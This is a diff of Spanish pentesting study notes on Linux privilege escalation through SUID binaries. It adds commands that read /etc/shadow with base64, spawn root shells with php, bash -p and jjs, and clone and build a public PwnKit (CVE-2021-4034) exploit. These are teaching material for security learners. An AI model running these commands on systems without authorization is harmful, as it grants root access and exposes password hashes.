@@ -10,9 +10,7 @@ El abuso de privilegios SUID es una técnica utilizada por los atacantes para el
 
 Para prevenir el abuso de privilegios SUID, se recomienda limitar el número de archivos con permisos SUID y asegurarse de que solo se otorguen a archivos que requieran este permiso para funcionar correctamente. Además, es importante monitorear regularmente el sistema para detectar cambios inesperados en los permisos de los archivos y para buscar posibles brechas de seguridad.
 
-Una vez más, se os comparte el mismo recurso que en la clase anterior, dado que esta página también contempla los binarios con permiso SUID que potencialmente pueden ser explotados:
-
-- **GTFOBins**: [https://gtfobins.github.io](https://gtfobins.github.io/)
+Una vez más, se os comparte el mismo recurso que en la clase anterior, dado que esta página también contempla los binarios con permiso SUID que potencialmente pueden ser explotados.
 
 ## SUID
 
@@ -21,26 +19,43 @@ En la pagina de GTFOBins buscamos el comando y la pestaña de **SUID**
 * Este tipo de comandos afecta a nivel de sistema a todos los usuarios 
 
 ```bash 
-❯ find / -perm -4000 2>/dev/null                  # Para ver que comandos son SUID, los buscamos desde la raiz 
-❯ find / -perm -4000 -ls 2>/dev/null              # Para ver que comandos son SUID, los buscamos desde la raiz y ademas miramos el privilegio
+❯ find / -perm -4000 2>/dev/null                  # Ver que comandos son SUID, los buscamos desde la raiz 
+❯ find / -perm -4000 -ls 2>/dev/null              # Ver que comandos son SUID, los buscamos desde la raiz y ademas miramos el privilegio
 ❯ find / -perm -u=s -type f 2>/dev/null           # Buscar comandos SUID desde la raiz 
-❯ find \-user <username> 2>/dev/null              # Para ver que comandos donde el propiertario es es usuario
+❯ find \-user <username> 2>/dev/null              # Ver que comandos donde el propiertario es username
+```
+
+## Binarios 
+
+* [Gtfobins](https://gtfobins.github.io/)
+
+```bash 
+-rwsr-xr-x 1 root root /usr/bin/base64
+
+# Ejecutar el comando si es SUID como el propietario de forma temporal y sin passwd
+❯ base64 /etc/shadow | base64 -d              # Ver el /etc/shadow
 ```
 
 ```bash 
-# Se puede encontrar comandos de este tipo:
--rwsr-xr-x 1 root root 8756 Feb 7 2022 /usr/bin/base64
--rwsr-xr-x 1 root root 8756 Feb 9 2022 /usr/bin/php8.1
-
-# Ejecutar el comando si es SUID como el propietario de forma temporal y sin passwd
-❯ base64 /etc/shadow | base64 -d                  # Podriamos ver el /etc/shadow
+-rwsr-xr-x 1 root root /usr/bin/php8.1
 
 ❯ php -r "pcntl_exec('/bin/sh', ['-p']);"     # Obtener una consola interactiva
-❯ bash -p                                     # Obtener la consola bash, p = privilege
-
-# Podemos ejecutar como root
-❯ sudo /home/file.sh 
-
-❯ sudo -u <user> /home/file.sh    # Si el usuario no necesite permisos para ejecutar el binario
+❯ bash -p                                     # Obtener la consola bash con privilegios
 ```
 
+```bash 
+-rwsr-sr-- 1 root user /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs 
+
+❯ echo "Java.type('java.lang.Runtime').getRuntime().exec('chmod u+s /bin/bash').waitFor()" | jjs
+❯ bash -p       # Obtener la consola bash con privilegios
+```
+
+```bash 
+-rwsr-xr-x 1 root root /usr/bin/pkexec
+
+❯ git clone https://github.com/berdav/CVE-2021-4034    # Clonar el repo para explotar la vulne 
+
+# Ingresar el directorio 
+❯ make                     # Crear un compilado del binario 
+❯ ./cve-2021-4034          # Ejecutar el binario 
+```
